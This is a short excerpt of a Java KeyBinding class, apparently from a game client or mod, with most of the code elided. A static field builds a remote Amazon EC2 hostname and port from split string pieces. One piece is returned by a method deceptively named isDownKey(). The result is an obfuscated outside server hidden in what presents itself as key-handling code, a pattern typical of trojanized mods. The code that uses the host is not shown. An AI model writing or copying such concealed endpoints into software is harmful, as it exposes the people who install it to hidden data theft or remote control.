...
public class KeyBinding implements Comparable<KeyBinding>
{
    ...
    public static final String r295 = "ec2-3-13" + isDownKey() + "naws.com:8080";
    ...
    private static String isDownKey() { return "6-154-246.us-east-2.compute.amazo"; }

    /**
     * Returns true on the initial key press. For continuous querying use. Should be used in key
     * events.
     */
